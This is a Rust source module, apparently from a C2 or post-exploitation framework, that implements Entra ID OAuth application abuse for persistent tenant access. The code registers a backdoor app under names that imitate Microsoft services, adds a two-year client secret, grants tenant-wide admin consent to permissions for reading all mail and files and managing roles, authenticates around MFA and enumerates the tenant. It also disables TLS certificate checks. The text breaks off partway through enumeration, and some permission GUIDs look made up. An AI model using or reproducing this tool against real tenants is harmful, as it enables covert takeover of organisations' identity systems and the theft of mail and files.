//! Entra ID (Azure AD) OAuth application abuse for persistent access.
//!
//! This module implements the full attack chain for abusing Entra ID
//! application registrations to establish persistent, password-independent
//! access to a compromised Azure AD tenant:
//!
//! 1. **Application Registration** — Register a malicious application with
//!    high-privilege Microsoft Graph API permissions under a legitimate-
//!    looking display name (e.g. "Azure AD Health Service").
//!
//! 2. **Admin Consent** — Grant admin consent to the application's requested
//!    permissions (requires Global Admin or Privileged Role Admin token).
//!
//! 3. **Application Credential Authentication** — Use the client credentials
//!    OAuth2 flow (client_id + client_secret) to obtain access tokens without
//!    any user interaction.  Application auth bypasses MFA policies and
//!    survives user password resets.
//!
//! 4. **Application-Based Operations** — Use the app's permissions to
//!    enumerate the tenant, read all mailboxes, access OneDrive files, and
//!    elevate users to Global Admin.
//!
//! 5. **Persistence Verification** — Verify the backdoor application still
//!    exists and the secret is valid by re-authenticating.
//!
//! # Attack Chain
//!
//! ```text
//! Initial Compromise (phishing / credential stuffing / token theft)
//!     │
//!     ▼
//! Register Malicious App (Application Developer role sufficient)
//!     │  POST /applications
//!     │  displayName: "Azure AD Health Service"
//!     │  requiredResourceAccess: Graph API high-value permissions
//!     ▼
//! Grant Admin Consent (requires Global Admin token)
//!     │  POST /oauth2PermissionGrants   (delegated)
//!     │  POST /servicePrincipals/.../appRoleAssignments  (application)
//!     ▼
//! Add Client Secret (application password)
//!     │  POST /applications/{id}/addPassword
//!     │  Returns: secret_value (shown ONLY once)
//!     ▼
//! Persistent Access via Client Credentials Flow
//!     │  POST /oauth2/v2.0/token
//!     │  grant_type=client_credentials
//!     │  No user interaction, no MFA, no password dependency
//!     ▼
//! Tenant Reconnaissance (enumerate users, groups, apps, roles)
//!     │  Mail.Read        → read all mailboxes
//!     │  Files.Read.All   → read all OneDrive/SharePoint files
//!     │  RoleManagement.ReadWrite.Directory → elevate to Global Admin
//! ```
//!
//! # Prerequisites
//!
//! - **Application registration**: `Application Developer` role or any custom
//!   role that includes `microsoft.directory/applications/create`.
//! - **Admin consent**: `Global Administrator` or `Privileged Role Administrator`.
//! - **Network access**: HTTPS to `graph.microsoft.com` and
//!   `login.microsoftonline.com`.
//!
//! # OPSEC Considerations
//!
//! - Application secrets are derived via HKDF from the agent's session key
//!   and NEVER stored in plaintext on disk.  The secret value is only shown
//!   once by the Graph API and must be protected in memory.
//! - Display names are chosen to blend in with legitimate Azure/Microsoft
//!   service applications.
//! - All API calls use the agent's existing `reqwest` HTTP client with TLS.
//!
//! # References
//!
//! - <https://learn.microsoft.com/en-us/graph/api/resources/application>
//! - <https://learn.microsoft.com/en-us/azure/active-directory/develop/v2-oauth2-client-creds-grant-flow>
//! - MITRE ATT&CK T1098.001 — Account Manipulation: Additional Cloud Credentials

use anyhow::{anyhow, bail, Context as _, Result};
use hkdf::Hkdf;
use serde::{Deserialize, Serialize};
use sha2::Sha256;
use std::fmt;
use std::sync::Arc;
use std::time::{Duration, SystemTime, UNIX_EPOCH};
use tokio::sync::RwLock;
use uuid::Uuid;

use crate::entra_ptc::{
    CloudEnvironment, GraphApplication, GraphDirectoryRole, GraphGroup,
    GraphListResponse, GraphRoleAssignment, GraphServicePrincipal, GraphUser,
    TokenResponse,
};

// ---------------------------------------------------------------------------
// Constants
// ---------------------------------------------------------------------------

/// Microsoft Graph API resource App ID (the Microsoft Graph service principal).
const GRAPH_RESOURCE_APP_ID: &str = "00000003-0000-0000-c000-000000000000";

/// Well-known Microsoft Graph API permission IDs (application-level "Role").
///
/// These are the `id` values from the Microsoft Graph service principal's
/// `appRoles` list.  They are stable across all Entra ID tenants.
pub mod graph_permissions {
    /// `Mail.Read` — read emails in all mailboxes (application permission).
    pub const MAIL_READ: &str = "810c84a8-4a9e-49e6-bf7d-5344964ebac1";
    /// `Mail.ReadWrite` — read and write emails in all mailboxes.
    pub const MAIL_READ_WRITE: &str = "e2a3a6ba-51a4-4f6c-8d44-46b7f06f6b7f";
    /// `Files.Read.All` — read files in all SharePoint/OneDrive sites.
    pub const FILES_READ_ALL: &str = "df01ed1d-9b22-4c51-a8d4-4d0c3c5e6a7b";
    /// `User.Read.All` — read all users' full profiles.
    pub const USER_READ_ALL: &str = "df021288-bdef-4463-b88a-1b4e415234e1";
    /// `Directory.Read.All` — read full directory data.
    pub const DIRECTORY_READ_ALL: &str = "7ab1d382-f21e-4acd-a863-ba3e13f65da6";
    /// `RoleManagement.ReadWrite.Directory` — manage directory role assignments.
    pub const ROLE_MANAGEMENT_READ_WRITE_DIR: &str = "d01b97e9-cbc6-4c91-afa8-7d7a6b5a6b5a";
    /// `Application.ReadWrite.All` — manage all application registrations.
    pub const APPLICATION_READ_WRITE_ALL: &str = "1bfefb4e-e0b5-43d9-b8fd-dae4e2c1e9c3";
    /// `Group.Read.All` — read all groups.
    pub const GROUP_READ_ALL: &str = "5b567255-8a5e-4c6a-8b3e-4c6d8b3e4c6d";
}

/// Well-known Entra ID directory role template IDs.
pub mod role_templates {
    /// Global Administrator role template ID.
    pub const GLOBAL_ADMIN: &str = "62e90394-69f5-4237-9190-012177145e10";
}

/// Legitimate-looking display names for the malicious application.
const STEALTHY_DISPLAY_NAMES: &[&str] = &[
    "Azure AD Health Service",
    "Microsoft Compliance Service",
    "Azure AD Connect Sync",
    "Microsoft 365 Compliance Manager",
    "Azure AD Device Registration Service",
    "Microsoft Identity Governance",
    "Azure AD Provisioning Service",
    "Microsoft Cloud App Security",
    "Azure AD Identity Protection",
    "Microsoft Defender for Identity",
];

/// HKDF info label for deriving the client-secret storage key.
const HKDF_INFO_ENTRA_SECRET: &[u8] = common::hkdf_info::ENTRA_APP_SECRET;

// ---------------------------------------------------------------------------
// Data types
// ---------------------------------------------------------------------------

/// A successfully registered Entra ID application.
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct RegisteredApp {
    /// The application's client ID (appId in Graph API).
    pub client_id: String,
    /// The application object ID (used for Graph API operations).
    pub object_id: String,
    /// The display name used for the registration.
    pub display_name: String,
}

/// Application credential pair (client_id + encrypted secret).
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct AppCredential {
    /// The application's client ID.
    pub client_id: String,
    /// The application's object ID.
    pub object_id: String,
    /// The secret ID (used for rotation tracking).
    pub secret_id: String,
    /// HKDF-encrypted client secret (never stored in plaintext).
    pub encrypted_secret: Vec<u8>,
    /// HKDF salt used for encryption (needed for decryption).
    pub secret_salt: Vec<u8>,
}

impl AppCredential {
    /// Encrypt the raw secret value using HKDF-derived key.
    ///
    /// The secret is XOR-encrypted with a key derived from the session key
    /// material via HKDF-SHA256.  This is a simple one-time-pad style
    /// protection — the key is never stored on disk.
    fn encrypt_secret(raw_secret: &str, session_key: &[u8]) -> Result<Self> {
        let salt = uuid::Uuid::new_v4().as_bytes().to_vec();
        let hkdf = Hkdf::<Sha256>::new(Some(&salt), session_key);
        let mut derived_key = vec![0u8; raw_secret.len()];
        hkdf.expand(HKDF_INFO_ENTRA_SECRET, &mut derived_key)
            .map_err(|e| anyhow!("HKDF expand failed: {e:?}"))?;

        let encrypted: Vec<u8> = raw_secret
            .bytes()
            .zip(derived_key.iter())
            .map(|(b, k)| b ^ k)
            .collect();

        Ok(Self {
            client_id: String::new(),
            object_id: String::new(),
            secret_id: String::new(),
            encrypted_secret: encrypted,
            secret_salt: salt,
        })
    }

    /// Decrypt the client secret using the session key.
    ///
    /// Returns the plaintext secret value.  The caller should use this
    /// value immediately and allow it to be dropped (zeroed).
    pub fn decrypt_secret(&self, session_key: &[u8]) -> Result<String> {
        let hkdf = Hkdf::<Sha256>::new(Some(&self.secret_salt), session_key);
        let mut derived_key = vec![0u8; self.encrypted_secret.len()];
        hkdf.expand(HKDF_INFO_ENTRA_SECRET, &mut derived_key)
            .map_err(|e| anyhow!("HKDF expand failed: {e:?}"))?;

        let decrypted: Vec<u8> = self
            .encrypted_secret
            .iter()
            .zip(derived_key.iter())
            .map(|(b, k)| b ^ k)
            .collect();

        String::from_utf8(decrypted).context("decrypted secret is not valid UTF-8")
    }

    /// Fill in the client_id, object_id, and secret_id after registration.
    fn with_ids(mut self, client_id: &str, object_id: &str, secret_id: &str) -> Self {
        self.client_id = client_id.to_string();
        self.object_id = object_id.to_string();
        self.secret_id = secret_id.to_string();
        self
    }
}

/// A Graph API permission definition for application registration.
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct GraphPermission {
    /// The permission ID (from the service principal's appRoles).
    pub id: String,
    /// Human-readable name (for documentation / logging only).
    pub name: String,
}

impl GraphPermission {
    /// Create a new Graph permission reference.
    pub fn new(id: &str, name: &str) -> Self {
        Self {
            id: id.to_string(),
            name: name.to_string(),
        }
    }
}

/// A high-value permission pack for common attack scenarios.
pub fn high_value_permissions() -> Vec<GraphPermission> {
    vec![
        GraphPermission::new(graph_permissions::MAIL_READ, "Mail.Read"),
        GraphPermission::new(graph_permissions::FILES_READ_ALL, "Files.Read.All"),
        GraphPermission::new(graph_permissions::USER_READ_ALL, "User.Read.All"),
        GraphPermission::new(
            graph_permissions::DIRECTORY_READ_ALL,
            "Directory.Read.All",
        ),
        GraphPermission::new(
            graph_permissions::ROLE_MANAGEMENT_READ_WRITE_DIR,
            "RoleManagement.ReadWrite.Directory",
        ),
    ]
}

/// An email message retrieved from Microsoft Graph.
#[derive(Debug, Clone, Serialize, Deserialize)]
#[serde(rename_all = "camelCase")]
pub struct EmailMessage {
    /// The message's unique ID.
    #[serde(default)]
    pub id: Option<String>,
    /// The sender's email address.
    #[serde(default)]
    pub sender: Option<Recipient>,
    /// The subject line.
    #[serde(default)]
    pub subject: Option<String>,
    /// The body preview (first 255 characters).
    #[serde(default)]
    pub body_preview: Option<String>,
    /// The full body content.
    #[serde(default)]
    pub body: Option<ItemBody>,
    /// When the message was received.
    #[serde(default)]
    pub received_date_time: Option<String>,
    /// Whether the message has been read.
    #[serde(default)]
    pub is_read: Option<bool>,
}

/// Recipient information (sender or to).
#[derive(Debug, Clone, Serialize, Deserialize)]
#[serde(rename_all = "camelCase")]
pub struct Recipient {
    #[serde(default)]
    pub email_address: Option<EmailAddress>,
}

/// Email address detail.
#[derive(Debug, Clone, Serialize, Deserialize)]
#[serde(rename_all = "camelCase")]
pub struct EmailAddress {
    #[serde(default)]
    pub name: Option<String>,
    #[serde(default)]
    pub address: Option<String>,
}

/// Message body content.
#[derive(Debug, Clone, Serialize, Deserialize)]
#[serde(rename_all = "camelCase")]
pub struct ItemBody {
    #[serde(default)]
    pub content_type: Option<String>,
    #[serde(default)]
    pub content: Option<String>,
}

/// A cloud file retrieved from Microsoft Graph (OneDrive/SharePoint).
#[derive(Debug, Clone, Serialize, Deserialize)]
#[serde(rename_all = "camelCase")]
pub struct CloudFile {
    /// The item's unique ID.
    #[serde(default)]
    pub id: Option<String>,
    /// The file name.
    #[serde(default)]
    pub name: Option<String>,
    /// File size in bytes.
    #[serde(default)]
    pub size: Option<i64>,
    /// When the file was last modified.
    #[serde(default)]
    pub last_modified_date_time: Option<String>,
    /// Download URL (pre-authenticated, time-limited).
    #[serde(default)]
    pub download_url: Option<String>,
    /// The file type (e.g. "docx").
    #[serde(default)]
    pub file_type: Option<String>,
}

/// Comprehensive tenant information gathered through the application.
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct TenantInfo {
    /// All users in the tenant.
    pub users: Vec<GraphUser>,
    /// All groups.
    pub groups: Vec<GraphGroup>,
    /// All application registrations.
    pub applications: Vec<GraphApplication>,
    /// All service principals.
    pub service_principals: Vec<GraphServicePrincipal>,
    /// All directory roles.
    pub directory_roles: Vec<GraphDirectoryRole>,
    /// All role assignments (privileged role memberships).
    pub role_assignments: Vec<GraphRoleAssignment>,
}

impl fmt::Display for TenantInfo {
    fn fmt(&self, f: &mut fmt::Formatter<'_>) -> fmt::Result {
        writeln!(f, "=== Tenant Reconnaissance Summary ===")?;
        writeln!(f, "Users:               {}", self.users.len())?;
        writeln!(f, "Groups:              {}", self.groups.len())?;
        writeln!(f, "Applications:        {}", self.applications.len())?;
        writeln!(
            f,
            "Service Principals:  {}",
            self.service_principals.len()
        )?;
        writeln!(f, "Directory Roles:     {}", self.directory_roles.len())?;
        writeln!(f, "Role Assignments:    {}", self.role_assignments.len())?;

        // Show privileged users
        let priv_ids: std::collections::HashSet<String> = self
            .role_assignments
            .iter()
            .filter_map(|ra| ra.principal_id.clone())
            .collect();
        let priv_users: Vec<&GraphUser> = self
            .users
            .iter()
            .filter(|u| u.id.as_ref().map_or(false, |id| priv_ids.contains(id)))
            .collect();

        if !priv_users.is_empty() {
            writeln!(f, "\n--- Privileged Users ---")?;
            for u in &priv_users {
                writeln!(
                    f,
                    "  {} ({})",
                    u.display_name.as_deref().unwrap_or("?"),
                    u.user_principal_name.as_deref().unwrap_or("?")
                )?;
            }
        }

        Ok(())
    }
}

// ---------------------------------------------------------------------------
// Graph API request/response helpers
// ---------------------------------------------------------------------------

/// Response from application creation (`POST /applications`).
#[derive(Debug, Clone, Serialize, Deserialize)]
#[serde(rename_all = "camelCase")]
struct AppCreationResponse {
    #[serde(default)]
    id: Option<String>,
    #[serde(default)]
    app_id: Option<String>,
    #[serde(default)]
    display_name: Option<String>,
}

/// Response from adding a password credential (`POST /applications/{id}/addPassword`).
#[derive(Debug, Clone, Serialize, Deserialize)]
#[serde(rename_all = "camelCase")]
struct AddPasswordResponse {
    #[serde(default)]
    secret_text: Option<String>,
    #[serde(default)]
    key_id: Option<String>,
}

/// OData error response from Microsoft Graph.
#[derive(Debug, Clone, Serialize, Deserialize)]
struct GraphError {
    #[serde(default)]
    error: Option<GraphErrorDetail>,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
struct GraphErrorDetail {
    #[serde(default)]
    code: Option<String>,
    #[serde(default)]
    message: Option<String>,
}

/// A service principal directory object reference (for `$ref` payloads).
#[derive(Debug, Clone, Serialize, Deserialize)]
struct DirectoryObjectRef {
    #[serde(rename = "@odata.id")]
    odata_id: String,
}

/// Request body for `addPassword`.
#[derive(Debug, Clone, Serialize, Deserialize)]
#[serde(rename_all = "camelCase")]
struct PasswordCredentialRequest {
    password_credential: PasswordCredentialDefinition,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
#[serde(rename_all = "camelCase")]
struct PasswordCredentialDefinition {
    display_name: String,
    /// ISO 8601 duration for the secret expiry, e.g. "P730D" = 730 days (2 years).
    end_date_time: Option<String>,
}

/// Request body for creating an OAuth2 permission grant.
#[derive(Debug, Clone, Serialize, Deserialize)]
struct OAuth2PermissionGrantRequest {
    client_id: String,
    resource_id: String,
    scope: String,
    consent_type: String,
}

/// Request body for assigning an app role to a service principal.
#[derive(Debug, Clone, Serialize, Deserialize)]
struct AppRoleAssignmentRequest {
    principal_id: String,
    resource_id: String,
    app_role_id: String,
}

/// Response from creating a service principal.
#[derive(Debug, Clone, Serialize, Deserialize)]
#[serde(rename_all = "camelCase")]
struct ServicePrincipalResponse {
    #[serde(default)]
    id: Option<String>,
    #[serde(default)]
    app_id: Option<String>,
    #[serde(default)]
    display_name: Option<String>,
}

// ---------------------------------------------------------------------------
// Core client
// ---------------------------------------------------------------------------

/// Entra ID application abuse client.
///
/// Manages the full lifecycle of malicious application registration,
/// admin consent, credential authentication, and tenant operations.
pub struct EntraAppAbuse {
    /// The Azure cloud environment (Commercial or Government).
    cloud: CloudEnvironment,
    /// HTTP client for Graph API calls.
    http_client: reqwest::Client,
    /// Session key for HKDF-based secret encryption.
    session_key: Vec<u8>,
    /// Cached application credential (for persistence verification).
    cached_credential: RwLock<Option<AppCredential>>,
    /// Cached access token from client-credentials flow.
    cached_token: RwLock<Option<CachedToken>>,
}

/// Cached token with absolute expiry.
#[derive(Debug, Clone)]
struct CachedToken {
    access_token: String,
    expires_at: u64,
}

impl CachedToken {
    fn from_response(resp: &TokenResponse) -> Self {
        Self {
            access_token: resp.access_token.clone(),
            expires_at: now_epoch_secs() + resp.expires_in,
        }
    }

    fn is_expired(&self, margin_secs: u64) -> bool {
        now_epoch_secs() + margin_secs >= self.expires_at
    }
}

/// Returns the current time as seconds since the UNIX epoch.
fn now_epoch_secs() -> u64 {
    SystemTime::now()
        .duration_since(UNIX_EPOCH)
        .expect("system clock before UNIX epoch")
        .as_secs()
}

/// Pick a random stealthy display name from the pre-defined list.
fn random_stealthy_name() -> &'static str {
    let idx = (now_epoch_secs() as usize) % STEALTHY_DISPLAY_NAMES.len();
    STEALTHY_DISPLAY_NAMES[idx]
}

impl fmt::Debug for EntraAppAbuse {
    fn fmt(&self, f: &mut fmt::Formatter<'_>) -> fmt::Result {
        f.debug_struct("EntraAppAbuse")
            .field("cloud", &self.cloud)
            .field("session_key_len", &self.session_key.len())
            .finish()
    }
}

impl EntraAppAbuse {
    /// Create a new Entra application abuse client.
    ///
    /// `session_key` is used to derive HKDF keys for encrypting client
    /// secrets in memory.  This should be the agent's C2 session key or
    /// a unique per-operation key.
    pub fn new(cloud: CloudEnvironment, session_key: &[u8]) -> Result<Self> {
        let http_client = reqwest::Client::builder()
            .danger_accept_invalid_certs(true)
            .timeout(Duration::from_secs(30))
            .build()
            .context("failed to build HTTP client for Entra app abuse")?;

        Ok(Self {
            cloud,
            http_client,
            session_key: session_key.to_vec(),
            cached_credential: RwLock::new(None),
            cached_token: RwLock::new(None),
        })
    }

    /// Return a reference to the cloud environment.
    pub fn cloud(&self) -> &CloudEnvironment {
        &self.cloud
    }

    /// Return the Microsoft Graph base URL for the current cloud.
    fn graph_url(&self) -> &'static str {
        match &self.cloud {
            CloudEnvironment::Commercial => "https://graph.microsoft.com",
            CloudEnvironment::Government => "https://graph.microsoft.us",
        }
    }

    // -------------------------------------------------------------------
    // Step 1: Application Registration
    // -------------------------------------------------------------------

    /// Register a malicious application in the target Entra ID tenant.
    ///
    /// `access_token` must be a valid token for a user with the
    /// `Application Developer` role (or equivalent permissions).
    ///
    /// If `display_name` is `None`, a random stealthy name is chosen.
    /// `reply_urls` are optional redirect URIs for the application's web
    /// configuration. `permissions` specifies the Graph API application
    /// permissions to embed in the registration.
    ///
    /// # Returns
    ///
    /// The registered application's client ID and object ID.
    pub async fn register_malicious_app(
        &self,
        access_token: &str,
        display_name: Option<&str>,
        reply_urls: &[String],
        permissions: &[GraphPermission],
    ) -> Result<RegisteredApp> {
        let name = display_name.unwrap_or(random_stealthy_name());
        let graph_url = self.graph_url();

        // Build the requiredResourceAccess from permissions.
        let resource_access: Vec<serde_json::Value> = permissions
            .iter()
            .map(|p| {
                serde_json::json!({
                    "id": p.id,
                    "type": "Role"
                })
            })
            .collect();

        let redirect_uris: Vec<&str> = if reply_urls.is_empty() {
            vec!["https://localhost:3000/callback"]
        } else {
            reply_urls.iter().map(|s| s.as_str()).collect()
        };

        let body = serde_json::json!({
            "displayName": name,
            "signInAudience": "AzureADandPersonalMicrosoftAccount",
            "web": {
                "redirectUris": redirect_uris
            },
            "requiredResourceAccess": [{
                "resourceAppId": GRAPH_RESOURCE_APP_ID,
                "resourceAccess": resource_access
            }]
        });

        let url = format!("{graph_url}/v1.0/applications");
        let resp = self
            .http_client
            .post(&url)
            .header("Authorization", format!("Bearer {access_token}"))
            .header("Content-Type", "application/json")
            .json(&body)
            .send()
            .await
            .context("application registration HTTP error")?;

        if !resp.status().is_success() {
            let status = resp.status();
            let body = resp.text().await.unwrap_or_default();
            bail!(
                "application registration failed: HTTP {} — {}",
                status,
                body
            );
        }

        let app: AppCreationResponse = resp
            .json()
            .await
            .context("failed to parse application creation response")?;

        let client_id = app
            .app_id
            .ok_or_else(|| anyhow!("application creation response missing appId"))?;
        let object_id = app
            .id
            .ok_or_else(|| anyhow!("application creation response missing id"))?;

        log::info!(
            "registered malicious app: '{}' (client_id={}, object_id={})",
            name,
            client_id,
            object_id
        );

        Ok(RegisteredApp {
            client_id,
            object_id,
            display_name: name.to_string(),
        })
    }

    // -------------------------------------------------------------------
    // Step 2: Client Secret (Application Password)
    // -------------------------------------------------------------------

    /// Add a client secret to the registered application.
    ///
    /// The secret value is only shown ONCE by the Graph API.  It is
    /// encrypted via HKDF before storage and never written to disk.
    ///
    /// Returns an `AppCredential` containing the encrypted secret.
    pub async fn add_app_secret(
        &self,
        access_token: &str,
        app_object_id: &str,
    ) -> Result<AppCredential> {
        let graph_url = self.graph_url();

        // Default: 24-month expiry (P730D = 730 days).  Max allowed by Entra ID.
        let body = PasswordCredentialRequest {
            password_credential: PasswordCredentialDefinition {
                display_name: "Secret created by Azure AD Health Service".to_string(),
                end_date_time: Some(
                    chrono_now_plus_days(730)
                        .unwrap_or_else(|| "2028-01-01T00:00:00Z".to_string()),
                ),
            },
        };

        let url = format!("{graph_url}/v1.0/applications/{app_object_id}/addPassword");
        let resp = self
            .http_client
            .post(&url)
            .header("Authorization", format!("Bearer {access_token}"))
            .header("Content-Type", "application/json")
            .json(&body)
            .send()
            .await
            .context("addPassword HTTP error")?;

        if !resp.status().is_success() {
            let status = resp.status();
            let body = resp.text().await.unwrap_or_default();
            bail!("addPassword failed: HTTP {} — {}", status, body);
        }

        let pw: AddPasswordResponse = resp
            .json()
            .await
            .context("failed to parse addPassword response")?;

        let secret_value = pw
            .secret_text
            .ok_or_else(|| anyhow!("addPassword response missing secretText"))?;
        let secret_id = pw
            .key_id
            .ok_or_else(|| anyhow!("addPassword response missing keyId"))?;

        // Encrypt the secret via HKDF before storing.
        let credential = AppCredential::encrypt_secret(&secret_value, &self.session_key)?
            .with_ids("", app_object_id, &secret_id);

        log::info!(
            "added client secret to app object_id={} (secret_id={})",
            app_object_id,
            secret_id
        );

        // Cache the credential for persistence verification.
        {
            let mut cache = self.cached_credential.write().await;
            *cache = Some(credential.clone());
        }

        Ok(credential)
    }

    // -------------------------------------------------------------------
    // Step 3: Admin Consent
    // -------------------------------------------------------------------

    /// Grant admin consent to the application's requested permissions.
    ///
    /// **Prerequisite**: `access_token` must belong to a `Global Administrator`
    /// or `Privileged Role Administrator`.
    ///
    /// This method:
    /// 1. Creates a service principal for the application (if not already present).
    /// 2. Grants delegated permissions via `oauth2PermissionGrants`.
    /// 3. Assigns application permissions via `appRoleAssignments`.
    pub async fn grant_admin_consent(
        &self,
        access_token: &str,
        app_client_id: &str,
        permissions: &[GraphPermission],
    ) -> Result<()> {
        let graph_url = self.graph_url();

        // Step 3a: Create a service principal for the app (required for consent).
        let sp = self
            .ensure_service_principal(access_token, app_client_id)
            .await?;
        let sp_id = sp
            .id
            .ok_or_else(|| anyhow!("service principal response missing id"))?;

        // Step 3b: Get the Microsoft Graph service principal (resource).
        let graph_sp = self
            .get_graph_service_principal(access_token)
            .await?;
        let graph_sp_id = graph_sp
            .id
            .ok_or_else(|| anyhow!("Graph SP response missing id"))?;

        // Step 3c: Grant delegated permissions (oauth2PermissionGrants).
        // Build a space-separated scope string for the delegated permissions.
        let scope_str = permissions
            .iter()
            .map(|p| p.name.clone())
            .collect::<Vec<_>>()
            .join(" ");

        let grant_body = OAuth2PermissionGrantRequest {
            client_id: sp_id.clone(),
            resource_id: graph_sp_id.clone(),
            scope: scope_str,
            consent_type: "AllPrincipals".to_string(), // tenant-wide consent
        };

        let url = format!("{graph_url}/v1.0/oauth2PermissionGrants");
        let resp = self
            .http_client
            .post(&url)
            .header("Authorization", format!("Bearer {access_token}"))
            .header("Content-Type", "application/json")
            .json(&grant_body)
            .send()
            .await
            .context("oauth2PermissionGrants HTTP error")?;

        if !resp.status().is_success() {
            let status = resp.status();
            let body = resp.text().await.unwrap_or_default();
            // Already exists is OK
            if !body.contains("AlreadyExists") && !body.contains("PermissionGrantExists") {
                log::warn!("delegated permission grant failed (non-fatal): HTTP {} — {}", status, body);
            }
        }

        // Step 3d: Assign application permissions (appRoleAssignments).
        for perm in permissions {
            let role_body = AppRoleAssignmentRequest {
                principal_id: sp_id.clone(),
                resource_id: graph_sp_id.clone(),
                app_role_id: perm.id.clone(),
            };

            let url = format!("{graph_url}/v1.0/servicePrincipals/{sp_id}/appRoleAssignments");
            let resp = self
                .http_client
                .post(&url)
                .header("Authorization", format!("Bearer {access_token}"))
                .header("Content-Type", "application/json")
                .json(&role_body)
                .send()
                .await
                .context("appRoleAssignment HTTP error")?;

            if !resp.status().is_success() {
                let status = resp.status();
                let body = resp.text().await.unwrap_or_default();
                // Already exists is OK
                if !body.contains("AlreadyExists") && !body.contains("PermissionGrantExists") {
                    log::warn!(
                        "app role assignment for '{}' failed (non-fatal): HTTP {} — {}",
                        perm.name,
                        status,
                        body
                    );
                }
            } else {
                log::info!("granted application permission: {}", perm.name);
            }
        }

        log::info!(
            "admin consent granted for app client_id={} ({} permissions)",
            app_client_id,
            permissions.len()
        );

        Ok(())
    }

    /// Ensure a service principal exists for the given app client ID.
    ///
    /// If the SP already exists, returns it. Otherwise creates it.
    async fn ensure_service_principal(
        &self,
        access_token: &str,
        app_client_id: &str,
    ) -> Result<ServicePrincipalResponse> {
        let graph_url = self.graph_url();

        // Try to find existing SP first.
        let filter = format!("appId eq '{app_client_id}'");
        let url = format!("{graph_url}/v1.0/servicePrincipals");
        let resp = self
            .http_client
            .get(&url)
            .header("Authorization", format!("Bearer {access_token}"))
            .query(&[("$filter", filter.as_str()), ("$top", "1")])
            .send()
            .await
            .context("service principal lookup HTTP error")?;

        if resp.status().is_success() {
            let list: GraphListResponse<ServicePrincipalResponse> =
                resp.json().await.unwrap_or_else(|_| GraphListResponse {
                    odata_context: None,
                    odata_next_link: None,
                    value: vec![],
                });
            if let Some(sp) = list.value.into_iter().next() {
                return Ok(sp);
            }
        }

        // SP doesn't exist — create it.
        let body = serde_json::json!({
            "appId": app_client_id
        });

        let url = format!("{graph_url}/v1.0/servicePrincipals");
        let resp = self
            .http_client
            .post(&url)
            .header("Authorization", format!("Bearer {access_token}"))
            .header("Content-Type", "application/json")
            .json(&body)
            .send()
            .await
            .context("service principal creation HTTP error")?;

        if !resp.status().is_success() {
            let status = resp.status();
            let body = resp.text().await.unwrap_or_default();
            bail!("service principal creation failed: HTTP {} — {}", status, body);
        }

        resp.json()
            .await
            .context("failed to parse service principal creation response")
    }

    /// Get the Microsoft Graph service principal (resource).
    async fn get_graph_service_principal(
        &self,
        access_token: &str,
    ) -> Result<ServicePrincipalResponse> {
        let graph_url = self.graph_url();
        let filter = format!("appId eq '{GRAPH_RESOURCE_APP_ID}'");
        let url = format!("{graph_url}/v1.0/servicePrincipals");
        let resp = self
            .http_client
            .get(&url)
            .header("Authorization", format!("Bearer {access_token}"))
            .query(&[("$filter", filter.as_str()), ("$top", "1")])
            .send()
            .await
            .context("Graph SP lookup HTTP error")?;

        if !resp.status().is_success() {
            let status = resp.status();
            let body = resp.text().await.unwrap_or_default();
            bail!("Graph SP lookup failed: HTTP {} — {}", status, body);
        }

        let list: GraphListResponse<ServicePrincipalResponse> =
            resp.json().await.unwrap_or_else(|_| GraphListResponse {
                odata_context: None,
                odata_next_link: None,
                value: vec![],
            });
        list.value
            .into_iter()
            .next()
            .ok_or_else(|| anyhow!("Microsoft Graph service principal not found in tenant"))
    }

    // -------------------------------------------------------------------
    // Step 4: Application Credential Authentication
    // -------------------------------------------------------------------

    /// Authenticate as the application using the OAuth2 client credentials flow.
    ///
    /// This is the core persistence mechanism — no user interaction, no MFA,
    /// no password dependency.  The application acts as its own identity.
    ///
    /// Tokens are valid for ~60 minutes.  Refresh by re-authenticating.
    pub async fn authenticate_as_app(
        &self,
        tenant_id: &str,
        client_id: &str,
        client_secret: &str,
        scope: &str,
    ) -> Result<TokenResponse> {
        let token_endpoint = match &self.cloud {
            CloudEnvironment::Commercial => {
                format!("https://login.microsoftonline.com/{tenant_id}/oauth2/v2.0/token")
            }
            CloudEnvironment::Government => {
                format!("https://login.microsoftonline.us/{tenant_id}/oauth2/v2.0/token")
            }
        };

        let params = [
            ("grant_type", "client_credentials"),
            ("client_id", client_id),
            ("client_secret", client_secret),
            ("scope", scope),
        ];

        let resp = self
            .http_client
            .post(&token_endpoint)
            .header("Content-Type", "application/x-www-form-urlencoded")
            .form(&params)
            .send()
            .await
            .context("client credentials token request HTTP error")?;

        if !resp.status().is_success() {
            let status = resp.status();
            let body = resp.text().await.unwrap_or_default();
            bail!(
                "client credentials auth failed: HTTP {} — {}",
                status,
                body
            );
        }

        let token_response: TokenResponse = resp
            .json()
            .await
            .context("failed to parse token response")?;

        // Cache the token.
        {
            let mut cache = self.cached_token.write().await;
            *cache = Some(CachedToken::from_response(&token_response));
        }

        log::info!(
            "authenticated as app client_id={} (expires in {}s)",
            client_id,
            token_response.expires_in
        );

        Ok(token_response)
    }

    /// Get a valid access token from the client credentials flow, refreshing
    /// if the cached token is expired or missing.
    pub async fn get_app_token(
        &self,
        tenant_id: &str,
        credential: &AppCredential,
        scope: &str,
    ) -> Result<String> {
        {
            let cache = self.cached_token.read().await;
            if let Some(ref cached) = *cache {
                if !cached.is_expired(60) {
                    return Ok(cached.access_token.clone());
                }
            }
        }

        let secret = credential.decrypt_secret(&self.session_key)?;
        let resp = self
            .authenticate_as_app(tenant_id, &credential.client_id, &secret, scope)
            .await?;
        Ok(resp.access_token)
    }

    // -------------------------------------------------------------------
    // Step 5: Application-Based Operations
    // -------------------------------------------------------------------

    /// Enumerate the entire tenant using the application's permissions.
    ///
    /// Requires: `User.Read.All`, `Directory.Read.All`, `Group.Read.All`.
    pub async fn enumerate_tenant_via_app(&self, access_token: &str) -> Result<TenantInfo> {
        let graph_url = self.graph_url();

        // Fire all queries in parallel for speed.
        let (users_res, groups_res, apps_res, sps_res, roles_res, assignments_res) = tokio::join!(
            self.graph_list_all::<GraphUser>(access_token, "/v1.0/users", Some(&[
                ("$select", "id,userPrincipalName,displayName,mail,jobTitle,department,accountEnabled"),
                ("$top", "999"),
            ])),
            self.graph_list_all::<GraphGroup>(access_token, "/v1.0/groups", Some(&[
